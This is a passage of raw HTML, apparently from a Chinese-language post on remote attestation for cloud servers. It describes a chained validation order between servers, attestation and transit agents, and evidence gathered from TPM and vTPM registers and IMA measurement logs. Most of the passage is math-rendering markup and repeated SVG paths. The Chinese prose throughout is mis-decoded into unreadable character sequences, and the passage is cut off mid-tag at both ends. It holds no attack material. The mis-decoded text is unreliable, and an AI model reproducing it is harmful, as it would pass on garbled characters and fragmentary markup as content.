class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>äº‘æœåŠ¡å™¨çš„è¿œç¨‹éªŒè¯é¡ºåºä¸º</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>C</mi><msub><mi>S</mi><mn>1</mn></msub><mover><mo stretchy="true" minsize="3.0em">â†’</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub><mover><mo stretchy="true" minsize="3.0em">â†’</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mover><mo stretchy="true" minsize="3.0em">â†’</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mi>i</mi></msub><mover><mo stretchy="true" minsize="3.0em">â†’</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mover><mo stretchy="true" minsize="3.0em">â†’</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub><mover><mo stretchy="true" minsize="3.0em">â†’</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mi>n</mi></msub></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(8)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">CS_1\xrightarrow{\text{validate}}CS_2\xrightarrow{\text{validate}}...\xrightarrow{\text{validate}}CS_i\xrightarrow{\text{validate}}...\xrightarrow{\text{validate}}CS_{n-1}\xrightarrow{\text{validate}}CS_n\tag8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2581em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2581em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1191em;vertical-align:-0.011em;"></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2581em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1191em;vertical-align:-0.011em;"></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.3164em;vertical-align:-0.2083em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.3581em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">8</span></span><span class="mord">)</span></span></span></span></span></span></p><p>å…¶ä¸­ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>i</mi><mo>â‰¤</mo><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1\leq i\leq n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼Œæœ€å <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mi>n</mi></msub><mover><mo stretchy="true" minsize="3.0em">â†’</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">CS_{n}\xrightarrow{\text{validate}}CS_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2581em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p><strong>Attestation Process</strong></p><p>è¿œç¨‹è®¤è¯è¿‡ç¨‹å¯åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼šæ”¶é›†ã€ä¼ è¾“å’ŒéªŒè¯è¯æ®ä¿¡æ¯ï¼Œå¦‚å›¾ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123141618906.png" alt="image-20241123141618906"></p><ul><li><p>ä¿¡æ¯æ”¶é›†</p><p>å›¾ä¸­çº¢è‰²è™šçº¿ä¸ºä¿¡æ¯æ”¶é›†éƒ¨åˆ†ï¼Œä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">CS_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ä¸ºä¾‹ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">CS_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ä½œä¸ºéªŒè¯è€…ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>S</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">CS2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">CS</span><span class="mord">2</span></span></span></span>ä½œä¸ºè¯æ˜è€…ã€‚</p><ol><li>éªŒè¯å™¨ä¸»æœºå±‚çš„éªŒè¯ä»£ç†ï¼ˆAttestation Agent,<code>AA</code>ï¼‰å‘<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">CS_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>è™šæ‹Ÿæœºç›‘æ§å™¨ï¼ˆVirtual Machine Monitor,<code>VMM</code>ï¼‰å±‚çš„ä¼ è¾“ä»£ç†ï¼ˆTransit Agent,<code>TA</code>ï¼‰å‘é€è¿œç¨‹éªŒè¯è¯·æ±‚ã€‚<code>TA</code>å‘ä¸»æœºåŠå…¶æ‰˜ç®¡çš„æ‰€æœ‰è™šæ‹Ÿæœºä¸­çš„<code>ICA</code>å¹¶è¡Œå‘èµ·ä¿¡æ¯æ”¶é›†è¯·æ±‚ã€‚</li><li><code>ICA</code>ä½¿ç”¨TPM_TOOLSæ”¶é›†è¯æ®ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ¥è‡ª<code>TPM</code>å’Œ<code>vTPM</code>çš„<code>PCR</code>å€¼ä»¥åŠäº‘æœåŠ¡å™¨å’Œè™šæ‹Ÿæœºä¸­<code>IMA</code>çš„æµ‹é‡æ—¥å¿—ï¼ˆ<code>ML</code>ã€<code>vML</code>ï¼‰ã€‚</li></ol></li><li><p>Transmitting the information</p><p>ä¿¡æ¯æ”¶é›†å®Œæˆå<code>TA</code>å°±ä¼šæ±‡æ€»ä»æ‰€æœ‰è¿è¡Œçš„è™šæ‹Ÿæœºæ”¶é›†åˆ°çš„è¯æ®å¹¶åŠ å¯†ï¼Œç„¶åå°†æ•°æ®ä¼ è¾“ç»™éªŒè¯å™¨ä¸­çš„<code>AA</code>ï¼Œå¦‚æ­¥éª¤3æ‰€ç¤ºã€‚</p><p>å¦‚ä¸‹å›¾æè¿°äº†ä» TA å‘ AA ä¼ è¾“è¯æ®ä¿¡æ¯çš„è¯¦ç»†è¿‡ç¨‹ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123165336646.png" alt="image-20241123165336646"></p><p>é¦–å…ˆï¼Œ<code>TA</code>å‘<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">CS_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" 